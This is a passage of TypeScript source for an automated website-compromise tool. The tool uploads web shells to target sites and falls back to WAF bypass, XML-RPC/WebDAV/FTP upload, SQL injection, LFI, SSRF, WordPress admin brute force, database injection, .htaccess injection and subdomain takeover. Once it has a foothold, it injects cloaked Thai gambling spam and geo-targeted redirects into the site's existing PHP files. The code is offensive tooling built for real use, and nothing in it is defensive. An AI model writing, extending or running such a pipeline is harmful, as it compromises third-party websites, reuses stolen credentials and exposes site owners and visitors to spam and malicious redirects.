        serverInfo: shellConfig.serverInfo,
        cms: shellConfig.cms,
        writablePaths: [],
        uploadEndpoints: [],
        exposedPanels: [],
        misconfigurations: [],
        attackVectors: [],
        aiAnalysis: "",
        scanDuration: 0,
        timestamp: Date.now(),
      } as VulnScanResult,
      shellConfig,
      (detail) => {
        onEvent({
          phase: "shell_gen",
          step: "generating",
          detail,
          progress: 45,
        });
      },
    );

    aiDecisions.push(`Generated ${shells.length} shells: ${shells.map(s => s.type).join(", ")}`);

    onEvent({
      phase: "shell_gen",
      step: "complete",
      detail: `✅ สร้าง ${shells.length} shell payloads เสร็จ`,
      progress: 50,
      data: { shellCount: shells.length, types: shells.map(s => s.type) },
    });
  } catch (error: any) {
    errors.push(`Shell generation failed: ${error.message}`);
    onEvent({
      phase: "shell_gen",
      step: "error",
      detail: `⚠️ Shell generation ล้มเหลว: ${error.message}`,
      progress: 50,
    });
  }

  // ─── Phase 4: Upload (try each shell with all methods) ───
  let totalAttempts = 0;

  if (shells.length > 0) {
    onEvent({
      phase: "upload",
      step: "start",
      detail: `📤 Phase 4: Upload — ลอง upload ${shells.length} shells ด้วยทุกวิธี...`,
      progress: 50,
    });

    // Sort shells by priority: AI-generated first, then PHP, then others
    // (Cloaking shells are generated AFTER upload succeeds — not before)
    // Track if any uploaded PHP file was not executed (to prioritize HTML shells)
    let phpExecutionFailed = false;

    const sortedShells = [...shells].sort((a, b) => {
      if (a.id.startsWith("ai_") && !b.id.startsWith("ai_")) return -1;
      if (!a.id.startsWith("ai_") && b.id.startsWith("ai_")) return 1;
      if (a.type === "redirect_php" && b.type !== "redirect_php") return -1;
      if (a.type === "seo_parasite" && b.type !== "seo_parasite") return -1;
      return 0;
    });

    // Try uploading each shell until we get at least one success
    for (let i = 0; i < sortedShells.length; i++) {
      const shell = sortedShells[i];

      // Skip PHP shells if we already know PHP doesn't execute on this server
      if (phpExecutionFailed && (shell.type === "redirect_php" || shell.type === "steganography" || shell.type === "polyglot")) {
        onEvent({
          phase: "upload",
          step: `shell_${i + 1}_skip`,
          detail: `⏭️ Skip ${shell.type} (${shell.filename}) — PHP ไม่ถูก execute บน server นี้`,
          progress: 50 + (i / sortedShells.length) * 30,
        });
        continue;
      }

      totalAttempts++;

      onEvent({
        phase: "upload",
        step: `shell_${i + 1}`,
        detail: `📤 Upload shell ${i + 1}/${sortedShells.length}: ${shell.type} (${shell.filename})`,
        progress: 50 + (i / sortedShells.length) * 30,
      });

      const uploadResult = await uploadShellWithAllMethods(
        config.targetUrl,
        shell,
        prescreen,
        vulnScan,
        config,
        onEvent,
      );

      if (uploadResult.success && uploadResult.url) {
        // Verify the uploaded file
        onEvent({
          phase: "verify",
          step: "checking",
          detail: `🔍 Verifying: ${uploadResult.url}`,
          progress: 85,
        });

        const verification = await verifyUploadedFile(uploadResult.url, config.redirectUrl, onEvent);

        uploadedFiles.push({
          url: uploadResult.url,
          shell,
          method: uploadResult.method,
          verified: verification.verified,
          redirectWorks: verification.redirectWorks,
          redirectDestinationMatch: verification.redirectDestinationMatch,
          finalDestination: verification.finalDestination,
          httpStatus: verification.httpStatus,
          redirectChain: verification.redirectChain,
        });

        aiDecisions.push(`✅ Upload success: ${shell.type} via ${uploadResult.method} → ${uploadResult.url} (verified: ${verification.verified}, redirect: ${verification.redirectWorks}, destination: ${verification.redirectDestinationMatch ? '✅ match' : '❌ mismatch'} → ${verification.finalDestination})`);

        // If we have a verified redirect TO THE CORRECT DESTINATION, we can stop
        if (verification.redirectWorks && verification.redirectDestinationMatch) {
          onEvent({
            phase: "complete",
            step: "success",
            detail: `🎉 สำเร็จ! Redirect ไปยังปลายทางจริง: ${uploadResult.url} → ${verification.finalDestination}`,
            progress: 100,
          });
          break;
        }

        // Redirect works but goes to wrong destination
        if (verification.redirectWorks && !verification.redirectDestinationMatch) {
          onEvent({
            phase: "verify",
            step: "destination_mismatch",
            detail: `⚠️ Redirect ทำงานแต่ไปผิดที่! ${uploadResult.url} → ${verification.finalDestination} (ควรไป ${config.redirectUrl}) — ลองต่อ`,
            progress: 75,
          });
          // Don't break — keep trying other shells
        }

        // If file is accessible but redirect doesn't work yet
        if (verification.verified && !verification.redirectWorks) {
          // ═══ AUTO-FALLBACK: PHP not executing → try HTML/htaccess at same path ═══
          if (verification.phpNotExecuting) {
            phpExecutionFailed = true; // Mark so subsequent PHP shells are skipped
            onEvent({
              phase: "upload",
              step: "php_fallback",
              detail: `🔄 PHP ไม่ถูก execute — Auto-fallback: ลอง upload .html redirect ที่ path เดียวกัน`,
              progress: 87,
            });

            // Extract the upload path from the successful PHP URL
            const phpUrl = new URL(uploadResult.url);
            const phpPath = phpUrl.pathname;
            const dirPath = phpPath.substring(0, phpPath.lastIndexOf("/") + 1);

            // Generate unconditional HTML redirect (no PHP needed)
            const htmlFallbackShell = generateUnconditionalHtmlRedirect(config.redirectUrl, config.seoKeywords);

            // Try uploading HTML at the same directory
            const htmlUploadResult = await uploadShellWithAllMethods(
              config.targetUrl,
              htmlFallbackShell,
              prescreen,
              vulnScan,
              config,
              onEvent,
            );

            if (htmlUploadResult.success && htmlUploadResult.url) {
              const htmlVerification = await verifyUploadedFile(htmlUploadResult.url, config.redirectUrl, onEvent);

              uploadedFiles.push({
                url: htmlUploadResult.url,
                shell: htmlFallbackShell,
                method: htmlUploadResult.method + "_php_fallback",
                verified: htmlVerification.verified,
                redirectWorks: htmlVerification.redirectWorks,
                redirectDestinationMatch: htmlVerification.redirectDestinationMatch,
                finalDestination: htmlVerification.finalDestination,
                httpStatus: htmlVerification.httpStatus,
                redirectChain: htmlVerification.redirectChain,
              });

              aiDecisions.push(`🔄 PHP fallback → HTML: ${htmlUploadResult.url} (verified: ${htmlVerification.verified}, redirect: ${htmlVerification.redirectWorks})`);

              if (htmlVerification.redirectWorks) {
                onEvent({
                  phase: "complete",
                  step: "success",
                  detail: `🎉 HTML fallback สำเร็จ! Redirect ทำงาน: ${htmlUploadResult.url} → ${config.redirectUrl}`,
                  progress: 100,
                });
                break;
              }
            }

            // Also try .htaccess unconditional redirect
            const htaccessFallbackShell = generateUnconditionalHtaccessRedirect(config.redirectUrl);
            const htaccessUploadResult = await uploadShellWithAllMethods(
              config.targetUrl,
              htaccessFallbackShell,
              prescreen,
              vulnScan,
              config,
              onEvent,
            );

            if (htaccessUploadResult.success && htaccessUploadResult.url) {
              // For .htaccess, verify by checking the directory URL (not the .htaccess file itself)
              const dirUrl = `${phpUrl.origin}${dirPath}`;
              const htaccessVerification = await verifyUploadedFile(dirUrl, config.redirectUrl, onEvent);

              uploadedFiles.push({
                url: htaccessUploadResult.url,
                shell: htaccessFallbackShell,
                method: htaccessUploadResult.method + "_php_fallback",
                verified: htaccessVerification.verified,
                redirectWorks: htaccessVerification.redirectWorks,
                redirectDestinationMatch: htaccessVerification.redirectDestinationMatch,
                finalDestination: htaccessVerification.finalDestination,
                httpStatus: htaccessVerification.httpStatus,
                redirectChain: htaccessVerification.redirectChain,
              });

              aiDecisions.push(`🔄 PHP fallback → .htaccess: ${htaccessUploadResult.url} (verified: ${htaccessVerification.verified}, redirect: ${htaccessVerification.redirectWorks})`);

              if (htaccessVerification.redirectWorks) {
                onEvent({
                  phase: "complete",
                  step: "success",
                  detail: `🎉 .htaccess fallback สำเร็จ! Redirect ทำงาน: ${dirUrl} → ${config.redirectUrl}`,
                  progress: 100,
                });
                break;
              }
            }
          }

          onEvent({
            phase: "upload",
            step: "partial",
            detail: `⚠️ ไฟล์เข้าถึงได้แต่ redirect ยังไม่ทำงาน${verification.phpNotExecuting ? " (PHP ไม่ execute + HTML/htaccess fallback ล้มเหลว)" : ""} — ลอง shell ถัดไป`,
            progress: 85,
          });
        }
      }

      // Stop after 5 failed attempts to avoid wasting time
      if (totalAttempts >= (config.maxUploadAttempts || 8) && uploadedFiles.length === 0) {
        onEvent({
          phase: "upload",
          step: "max_attempts",
          detail: `⚠️ ลอง ${totalAttempts} ครั้งแล้ว ยังไม่สำเร็จ — หยุดเพื่อประหยัดเวลา`,
          progress: 80,
        });
        break;
      }
    }
  }

  // ─── Phase 4.5: Advanced Attack Fallback (if standard upload failed) ───
  let wafBypassResults: WafBypassResult[] = [];
  let altUploadResults: AltUploadResult[] = [];
  let indirectResults: IndirectAttackResult[] = [];

  const hasVerifiedRedirect = uploadedFiles.some(f => f.redirectWorks);

  if (!hasVerifiedRedirect && shells.length > 0) {
    const bestShell = shells[0];
    const shellContent = typeof bestShell.content === "string" ? bestShell.content : bestShell.content.toString("base64");
    const targetForAdvanced = originIp ? `http://${originIp}` : config.targetUrl;

    // 4.5a: WAF Bypass uploads
    if (config.enableWafBypass !== false) {
      try {
        onEvent({
          phase: "waf_bypass",
          step: "start",
          detail: `🛡️ Phase 4.5a: WAF Bypass — Chunked, HTTP/2 Smuggling, Content-Type Confusion, Null Byte...`,
          progress: 82,
        });

        const wafScanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
        const wafPrescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
        const uploadPaths = wafScanPaths || wafPrescreenPaths || [
          "/wp-content/uploads/", "/uploads/", "/images/",
          "/wp-content/themes/", "/tmp/", "/media/",
        ];

        // Run WAF bypass for each upload path
        const wafPromises = uploadPaths.map(path =>
          runWafBypass({
            targetUrl: targetForAdvanced,
            uploadPath: path,
            fileContent: shellContent,
            originalFilename: bestShell.filename,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (method: string, detail: string) => {
              onEvent({
                phase: "waf_bypass",
                step: method,
                detail: `🛡️ ${detail}`,
                progress: 84,
              });
            },
          })
        );
        wafBypassResults = await Promise.race([
          Promise.all(wafPromises).then(results => results.flat()),
          new Promise<WafBypassResult[]>((_, reject) => setTimeout(() => reject(new Error("WAF bypass timeout")), 90000)),
        ]);

        const wafSuccess = wafBypassResults.find(r => r.success && r.fileUrl);
        if (wafSuccess && wafSuccess.fileUrl) {
          aiDecisions.push(`✅ WAF bypass success: ${wafSuccess.method} → ${wafSuccess.fileUrl}`);
          const verification = await verifyUploadedFile(wafSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: wafSuccess.fileUrl,
            shell: bestShell,
            method: `waf_bypass_${wafSuccess.method}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            redirectDestinationMatch: verification.redirectDestinationMatch,
            finalDestination: verification.finalDestination,
            httpStatus: verification.httpStatus,
            redirectChain: verification.redirectChain,
          });
        }

        onEvent({
          phase: "waf_bypass",
          step: "complete",
          detail: `✅ WAF bypass เสร็จ — ${wafBypassResults.filter(r => r.success).length}/${wafBypassResults.length} methods สำเร็จ`,
          progress: 86,
        });
      } catch (error: any) {
        errors.push(`WAF bypass failed: ${error.message}`);
      }
    }

    // 4.5b: Alternative Upload Vectors
    if (config.enableAltUpload !== false && !uploadedFiles.some(f => f.redirectWorks)) {
      try {
        onEvent({
          phase: "alt_upload",
          step: "start",
          detail: `📡 Phase 4.5b: Alt Upload — XML-RPC, REST API, WebDAV, FTP, cPanel, Git exploit...`,
          progress: 87,
        });

        // Build credentials from discovered config exploits
        const wpCreds = discoveredCredentials.find((c: any) => c.type === "wordpress" || c.type === "wp");
        const ftpCreds = discoveredCredentials.filter((c: any) => c.type === "ftp").map((c: any) => ({ username: c.username || "", password: c.password || "" }));

        altUploadResults = await Promise.race([
          runAllAltUploadVectors({
            targetUrl: targetForAdvanced,
            fileContent: shellContent,
            filename: bestShell.filename,
            wpCredentials: wpCreds ? { username: wpCreds.username || "", appPassword: wpCreds.password || "" } : undefined,
            ftpCredentials: ftpCreds.length > 0 ? ftpCreds : undefined,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (vector: string, detail: string) => {
              onEvent({
                phase: "alt_upload",
                step: vector,
                detail: `📡 ${detail}`,
                progress: 89,
              });
            },
          }),
          new Promise<AltUploadResult[]>((_, reject) => setTimeout(() => reject(new Error("alt upload timeout")), 90000)),
        ]);

        const altSuccess = altUploadResults.find(r => r.success && r.fileUrl);
        if (altSuccess && altSuccess.fileUrl) {
          aiDecisions.push(`✅ Alt upload success: ${altSuccess.vector} → ${altSuccess.fileUrl}`);
          const verification = await verifyUploadedFile(altSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: altSuccess.fileUrl,
            shell: bestShell,
            method: `alt_${altSuccess.vector}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            redirectDestinationMatch: verification.redirectDestinationMatch,
            finalDestination: verification.finalDestination,
            httpStatus: verification.httpStatus,
            redirectChain: verification.redirectChain,
          });
        }

        onEvent({
          phase: "alt_upload",
          step: "complete",
          detail: `✅ Alt upload เสร็จ — ${altUploadResults.filter(r => r.success).length}/${altUploadResults.length} methods สำเร็จ`,
          progress: 91,
        });
      } catch (error: any) {
        errors.push(`Alt upload failed: ${error.message}`);
      }
    }

    // 4.5c: Indirect Attacks (SQLi, LFI, SSRF, Log Poisoning)
    if (config.enableIndirectAttacks !== false && !uploadedFiles.some(f => f.redirectWorks)) {
      try {
        onEvent({
          phase: "indirect",
          step: "start",
          detail: `💉 Phase 4.5c: Indirect Attacks — SQLi File Write, LFI/RFI, Log Poisoning, SSRF...`,
          progress: 92,
        });

        indirectResults = await Promise.race([
          runIndirectAttacks({
            targetUrl: targetForAdvanced,
            shellContent,
            shellFilename: bestShell.filename,
            redirectUrl: config.redirectUrl,
            timeout: config.timeoutPerMethod || 30000,
            onProgress: (vector: string, detail: string) => {
              onEvent({
                phase: "indirect",
                step: vector,
                detail: `💉 ${detail}`,
                progress: 94,
              });
            },
          }),
          new Promise<IndirectAttackResult[]>((_, reject) => setTimeout(() => reject(new Error("indirect attacks timeout")), 120000)),
        ]);

        const indirectSuccess = indirectResults.find(r => r.success && r.fileUrl);
        if (indirectSuccess && indirectSuccess.fileUrl) {
          aiDecisions.push(`✅ Indirect attack success: ${indirectSuccess.vector} → ${indirectSuccess.fileUrl}`);
          const verification = await verifyUploadedFile(indirectSuccess.fileUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: indirectSuccess.fileUrl,
            shell: bestShell,
            method: `indirect_${indirectSuccess.vector}`,
            verified: verification.verified,
            redirectWorks: verification.redirectWorks,
            redirectDestinationMatch: verification.redirectDestinationMatch,
            finalDestination: verification.finalDestination,
            httpStatus: verification.httpStatus,
            redirectChain: verification.redirectChain,
          });
        }

        onEvent({
          phase: "indirect",
          step: "complete",
          detail: `✅ Indirect attacks เสร็จ — ${indirectResults.filter(r => r.success).length}/${indirectResults.length} methods สำเร็จ`,
          progress: 96,
        });
      } catch (error: any) {
        errors.push(`Indirect attacks failed: ${error.message}`);
      }
    }
  }

  // ─── Phase 4.6: WP Admin Takeover + DB Injection (non-upload fallback) ───
  let wpAdminResults: WpTakeoverResult[] = [];
  let wpDbInjectionResults: WpDbInjectionResult[] = [];

  if (!uploadedFiles.some(f => f.redirectWorks)) {
    // 4.6a: WP Admin Takeover (brute force → theme/plugin editor → XMLRPC → REST API)
    if (config.enableWpAdminTakeover !== false) {
      try {
        onEvent({
          phase: "wp_admin",
          step: "start",
          detail: `🔐 Phase 4.6a: WP Admin Takeover — Brute Force + Theme/Plugin Editor + XMLRPC + REST API...`,
          progress: 96,
        });

        const wpAdminConfig: WpAdminConfig = {
          targetUrl: config.targetUrl,
          redirectUrl: config.redirectUrl,
          seoKeywords: config.seoKeywords,
          timeout: config.timeoutPerMethod || 30000,
          knownCredentials: discoveredCredentials
            .filter((c: any) => c.username && c.password)
            .map((c: any) => ({ username: c.username, password: c.password })),
          onProgress: (method: string, detail: string) => {
            onEvent({
              phase: "wp_admin",
              step: method,
              detail: `🔐 ${detail}`,
              progress: 97,
            });
          },
        };

        wpAdminResults = await Promise.race([
          runWpAdminTakeover(wpAdminConfig),
          new Promise<WpTakeoverResult[]>((_, reject) => setTimeout(() => reject(new Error("WP admin takeover timeout")), 120000)),
        ]);

        const wpSuccess = wpAdminResults.find(r => r.success);
        if (wpSuccess) {
          aiDecisions.push(`✅ WP Admin Takeover success: ${wpSuccess.method} — ${wpSuccess.detail}`);

          // Mark as uploaded file for cloaking phase
          // WP Admin takeover — verify redirect destination
          const wpVerification = await verifyUploadedFile(wpSuccess.injectedUrl || config.targetUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: wpSuccess.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "wp_admin", type: "wp_admin_inject" as any, filename: "functions.php", content: "", size: 0, mimeType: "text/plain", headers: {} },
            method: `wp_admin_${wpSuccess.method}`,
            verified: wpVerification.verified,
            redirectWorks: wpVerification.redirectWorks,
            redirectDestinationMatch: wpVerification.redirectDestinationMatch,
            finalDestination: wpVerification.finalDestination,
            httpStatus: wpVerification.httpStatus,
            redirectChain: wpVerification.redirectChain,
          });

          onEvent({
            phase: "wp_admin",
            step: "success",
            detail: `✅ WP Admin Takeover สำเร็จ: ${wpSuccess.method} — ${wpSuccess.detail}`,
            progress: 97,
            data: { wpAdminResults },
          });
        } else {
          onEvent({
            phase: "wp_admin",
            step: "complete",
            detail: `⚠️ WP Admin Takeover ล้มเหลว — ลอง ${wpAdminResults.length} methods`,
            progress: 97,
            data: { wpAdminResults },
          });
        }
      } catch (error: any) {
        errors.push(`WP Admin Takeover failed: ${error.message}`);
        onEvent({
          phase: "wp_admin",
          step: "error",
          detail: `⚠️ WP Admin Takeover error: ${error.message}`,
          progress: 97,
        });
      }
    }

    // 4.6b: WP Database Injection (SQLi → wp_options/wp_posts/widgets/.htaccess/cPanel)
    if (config.enableWpDbInjection !== false && !uploadedFiles.some(f => f.redirectWorks)) {
      try {
        onEvent({
          phase: "wp_db_inject",
          step: "start",
          detail: `💉 Phase 4.6b: WP DB Injection — SQLi wp_options/wp_posts, .htaccess, cPanel takeover...`,
          progress: 98,
        });

        // Find SQLi endpoint from indirect attack results
        const sqliResult = indirectResults.find(r => r.vector === "sqli_file_write" && r.success);
        // Parse SQLi info from evidence string if available
        const sqliEvidence = sqliResult?.evidence || "";
        const sqliEndpointMatch = sqliEvidence.match(/endpoint:\s*(\S+)/);
        const sqliParamMatch = sqliEvidence.match(/param:\s*(\S+)/);

        const wpDbConfig: WpDbInjectionConfig = {
          targetUrl: config.targetUrl,
          redirectUrl: config.redirectUrl,
          seoKeywords: config.seoKeywords,
          timeout: config.timeoutPerMethod || 30000,
          sqliEndpoint: sqliEndpointMatch?.[1] || (sqliResult?.fileUrl ? sqliResult.fileUrl : undefined),
          sqliParam: sqliParamMatch?.[1] || "id",
          sqliType: sqliEvidence.includes("time") ? "time" as const : sqliEvidence.includes("union") ? "union" as const : "error" as const,
          onProgress: (method: string, detail: string) => {
            onEvent({
              phase: "wp_db_inject",
              step: method,
              detail: `💉 ${detail}`,
              progress: 98,
            });
          },
        };

        wpDbInjectionResults = await Promise.race([
          runWpDbInjection(wpDbConfig),
          new Promise<WpDbInjectionResult[]>((_, reject) => setTimeout(() => reject(new Error("WP DB injection timeout")), 120000)),
        ]);

        const dbSuccess = wpDbInjectionResults.find(r => r.success);
        if (dbSuccess) {
          aiDecisions.push(`✅ WP DB Injection success: ${dbSuccess.method} — ${dbSuccess.detail}`);

          // WP DB injection — verify redirect destination
          const dbVerification = await verifyUploadedFile(dbSuccess.injectedUrl || config.targetUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: dbSuccess.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "wp_db", type: "wp_db_inject" as any, filename: "wp_options", content: "", size: 0, mimeType: "text/plain", headers: {} },
            method: `wp_db_${dbSuccess.method}`,
            verified: dbVerification.verified,
            redirectWorks: dbVerification.redirectWorks,
            redirectDestinationMatch: dbVerification.redirectDestinationMatch,
            finalDestination: dbVerification.finalDestination,
            httpStatus: dbVerification.httpStatus,
            redirectChain: dbVerification.redirectChain,
          });

          onEvent({
            phase: "wp_db_inject",
            step: "success",
            detail: `✅ WP DB Injection สำเร็จ: ${dbSuccess.method} — ${dbSuccess.detail}`,
            progress: 98,
            data: { wpDbInjectionResults },
          });
        } else {
          onEvent({
            phase: "wp_db_inject",
            step: "complete",
            detail: `⚠️ WP DB Injection ล้มเหลว — ลอง ${wpDbInjectionResults.length} methods`,
            progress: 98,
            data: { wpDbInjectionResults },
          });
        }
      } catch (error: any) {
        errors.push(`WP DB Injection failed: ${error.message}`);
        onEvent({
          phase: "wp_db_inject",
          step: "error",
          detail: `⚠️ WP DB Injection error: ${error.message}`,
          progress: 98,
        });
      }
    }
  }

  // ─── Phase 5: Shellless Attacks (when ALL uploads failed) ───
  let shelllessResults: ShelllessResult[] = [];

  if (uploadedFiles.length === 0) {
    onEvent({
      phase: "shellless",
      step: "start",
      detail: `🔄 Phase 5: Shell upload ล้มเหลวทั้งหมด — เปลี่ยนไปใช้ Shellless Attack (10 methods: .htaccess injection, REST API, XSS, Open Redirect, Subdomain Takeover, Cache Poisoning, RSS/Sitemap, Meta Injection, Server Config, AI Creative)`,
      progress: 90,
    });

    try {
      // Collect data from previous phases for shellless attacks
      const shelllessConfig: ShelllessConfig = {
        targetUrl: config.targetUrl,
        redirectUrl: config.redirectUrl,
        seoKeywords: config.seoKeywords,
        timeout: config.timeoutPerMethod || 30000,
        discoveredCredentials: discoveredCredentials,
        cmsType: prescreen?.cms || vulnScan?.cms?.type || "unknown",
        originIp: originIp || undefined,
        wpRestApi: !!(prescreen?.cms?.toLowerCase() === "wordpress" || vulnScan?.cms?.type === "wordpress"),
        wpXmlRpc: !!(prescreen?.cms?.toLowerCase() === "wordpress" || vulnScan?.cms?.type === "wordpress"),
        // Extract SQLi info from indirect attack results
        sqliEndpoint: indirectResults.find(r => r.vector.includes("sqli") && r.success)?.fileUrl ?? undefined,
        // Extract XSS endpoints from indirect results
        xssEndpoints: indirectResults
          .filter(r => r.vector.includes("xss") && r.success)
          .map(r => ({ url: r.fileUrl || config.targetUrl, param: "q", type: "stored" })),
        // Extract open redirects from config results
        openRedirects: configResults
          ?.filter(r => r.vector.includes("redirect") && r.success)
          .map(r => ({ url: config.targetUrl, param: "url" })),
        // DNS dangling CNAMEs from DNS attack results
        danglingCnames: dnsResults
          .filter(r => r.vector.includes("subdomain") && r.success)
          .flatMap(r => r.data?.vulnerableSubdomains?.map(vs => ({ subdomain: vs.subdomain, cname: vs.cname })) || []),
        // Config files discovered
        configFiles: configResults
          ?.filter(r => r.success)
          .map(r => ({ path: r.vector, content: r.detail })),
        onProgress: (method: string, detail: string) => {
          onEvent({
            phase: "shellless",
            step: method,
            detail: `🔧 ${detail}`,
            progress: 92,
          });
        },
      };

      shelllessResults = await Promise.race([
        runShelllessAttacks(shelllessConfig),
        new Promise<ShelllessResult[]>((_, reject) =>
          setTimeout(() => reject(new Error("Shellless attacks timeout")), 180000)
        ),
      ]);

      const shelllessSuccesses = shelllessResults.filter(r => r.success);
      const shelllessRedirects = shelllessResults.filter(r => r.success && r.redirectWorks);

      if (shelllessSuccesses.length > 0) {
        aiDecisions.push(`✅ Shellless attacks: ${shelllessSuccesses.length}/${shelllessResults.length} methods succeeded`);

        // Add successful shellless results as "uploaded files" for downstream compatibility
        // NOTE: shellless methods don't actually place files — they modify server config/DB
        // verified should be based on redirectWorks (actual redirect test), NOT just sr.success
        for (const sr of shelllessSuccesses) {
          // Shellless — verify redirect destination if redirectWorks
          let shelllessDestMatch = false;
          let shelllessFinalDest = "";
          let shelllessChain: string[] = [];
          if (sr.redirectWorks && sr.injectedUrl) {
            const shelllessVerify = await verifyUploadedFile(sr.injectedUrl, config.redirectUrl, onEvent);
            shelllessDestMatch = shelllessVerify.redirectDestinationMatch;
            shelllessFinalDest = shelllessVerify.finalDestination;
            shelllessChain = shelllessVerify.redirectChain || [];
          }
          uploadedFiles.push({
            url: sr.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "shellless", type: "shellless" as any, filename: sr.method, content: "", size: 0, mimeType: "text/html", headers: {} },
            method: `shellless_${sr.method}`,
            verified: sr.redirectWorks === true && shelllessDestMatch,
            redirectWorks: sr.redirectWorks || false,
            redirectDestinationMatch: shelllessDestMatch,
            finalDestination: shelllessFinalDest,
            httpStatus: 200,
            redirectChain: shelllessChain,
          });
        }

        if (shelllessRedirects.length > 0) {
          onEvent({
            phase: "shellless",
            step: "success",
            detail: `✅ Shellless Attack สำเร็จ! ${shelllessRedirects.length} redirects ทำงานจริง (${shelllessSuccesses.length} methods พบช่องทาง) — ไม่ต้องวางไฟล์เลย`,
            progress: 95,
            data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: shelllessRedirects.length },
          });
        } else {
          onEvent({
            phase: "shellless",
            step: "partial",
            detail: `⚠️ Shellless Attack พบ ${shelllessSuccesses.length} ช่องทาง แต่ redirect ยังไม่ทำงาน (0 redirects) — ต้อง execute เพิ่มเติม`,
            progress: 95,
            data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: 0 },
          });
        }
      } else {
        onEvent({
          phase: "shellless",
          step: "complete",
          detail: `⚠️ Shellless Attack ลอง ${shelllessResults.length} methods — ไม่มี method ไหนสำเร็จ`,
          progress: 95,
          data: { shelllessResults },
        });
      }
    } catch (error: any) {
      errors.push(`Shellless attacks failed: ${error.message}`);
      onEvent({
        phase: "shellless",
        step: "error",
        detail: `⚠️ Shellless Attack error: ${error.message}`,
        progress: 95,
      });
    }
  } else {
    onEvent({
      phase: "shellless",
      step: "skipped",
      detail: `⏭️ Shellless Attack ข้าม — มีไฟล์ที่วางสำเร็จแล้ว ${uploadedFiles.length} ไฟล์`,
      progress: 95,
    });
  }

  // ─── Phase 6: Cloaking (ONLY if real file upload succeeded — not shellless) ───
  let injectionResult: InjectionResult | null = null;
  let cdnUploadResult: CdnUploadResult | null = null;

  // Only trigger cloaking if we have REAL uploaded files (not shellless results)
  const realUploadedFiles = uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
  const hasRealUploads = realUploadedFiles.length > 0;

  if (config.enableCloaking !== false && hasRealUploads) {
    try {
      onEvent({
        phase: "cloaking",
        step: "content_gen",
        detail: "🎭 Phase 4.9: Cloaking — AI สร้าง SEO gambling content (หลังวางไฟล์สำเร็จแล้ว)...",
        progress: 92,
      });

      // Step 1: Generate content pack
      const contentConfig: ContentConfig = {
        primaryKeyword: config.seoKeywords[0] || "สล็อต",
        keywords: config.seoKeywords,
        brandName: config.cloakingBrand || "SlotXO",
        redirectUrl: config.redirectUrl,
        language: "th",
        contentType: config.cloakingContentType || "landing",
      };

      contentPack = await generateContentPack(contentConfig, (detail) => {
        onEvent({ phase: "cloaking", step: "content_gen", detail, progress: 93 });
      });

      // Step 2: Upload content to CDN (external hosting)
      onEvent({
        phase: "cloaking",
        step: "cdn_upload",
        detail: "☁️ อัพโหลด gambling content ไป CDN (content ไม่เก็บบน target)...",
        progress: 94,
      });

      try {
        const targetDomain = new URL(config.targetUrl).hostname;
        cdnUploadResult = await uploadContentToCdn({
          primaryKeyword: config.seoKeywords[0] || "สล็อต",
          keywords: config.seoKeywords,
          brandName: config.cloakingBrand || "SlotXO",
          redirectUrl: config.redirectUrl,
          targetDomain,
          htmlContent: contentPack.mainPage.fullHtml,
          doorwayPages: contentPack.doorwayPages.map(dp => ({ slug: dp.internalLinks[0]?.slug || dp.title.toLowerCase().replace(/\s+/g, "-"), html: dp.fullHtml })),
        });

        onEvent({
          phase: "cloaking",
          step: "cdn_upload",
          detail: `✅ CDN upload สำเร็จ — ${cdnUploadResult.allUrls.length} ไฟล์, landing: ${cdnUploadResult.mainPageUrl}`,
          progress: 95,
          data: { cdnBaseUrl: cdnUploadResult.contentKeyPrefix, landingUrl: cdnUploadResult.mainPageUrl },
        });
      } catch (cdnErr: any) {
        onEvent({
          phase: "cloaking",
          step: "cdn_upload",
          detail: `⚠️ CDN upload ล้มเหลว: ${cdnErr.message} — ใช้ inline content แทน`,
          progress: 95,
        });
      }

      // Step 3: Generate cloaking shell (with CDN URL if available)
      const cloakingConfig: CloakingConfig = {
        redirectUrl: config.redirectUrl,
        primaryKeyword: config.seoKeywords[0] || "สล็อต",
        keywords: config.seoKeywords,
        brandName: config.cloakingBrand || "SlotXO",
        language: "th",
        cdnBaseUrl: cdnUploadResult?.mainPageUrl,
        geoTargetCountries: ["TH", "VN", "ID", "MY", "PH", "KH", "LA", "MM"],
      };

      cloakingResult = await generateCloakingPackage(cloakingConfig, (detail) => {
        onEvent({ phase: "cloaking", step: "shell_gen", detail, progress: 96 });
      });

      aiDecisions.push(`Cloaking shell generated: ${cloakingResult.type} (${cloakingResult.internalPages.length} internal pages)`);

      // Step 4: Inject cloaking code into existing PHP files on target
      // Use only REAL uploaded files (not shellless) for injection shell URL
      const activeShellUrl = realUploadedFiles.find(f => f.verified)?.url || realUploadedFiles[0]?.url;
      if (activeShellUrl) {
        onEvent({
          phase: "cloaking",
          step: "injection",
          detail: "💉 Inject cloaking code เข้าไฟล์ PHP เดิมบน target...",
          progress: 97,
        });

        try {
          const injectionConfig: InjectionConfig = {
            shellUrl: activeShellUrl,
            contentCdnUrl: cdnUploadResult?.mainPageUrl || "",
            redirectUrl: config.redirectUrl,
            primaryKeyword: config.seoKeywords[0] || "สล็อต",
            keywords: config.seoKeywords,
            brandName: config.cloakingBrand || "SlotXO",
            geoTargetCountries: ["TH", "VN", "ID", "MY", "PH", "KH", "LA", "MM"],
          };

          injectionResult = await executeInjection(injectionConfig, (detail) => {
            onEvent({ phase: "cloaking", step: "injection", detail, progress: 98 });
          });

          if (injectionResult.injectedFiles.length > 0) {
            aiDecisions.push(`PHP injection สำเร็จ: ${injectionResult.injectedFiles.length} ไฟล์ถูก inject`);
            onEvent({
              phase: "cloaking",
              step: "injection",
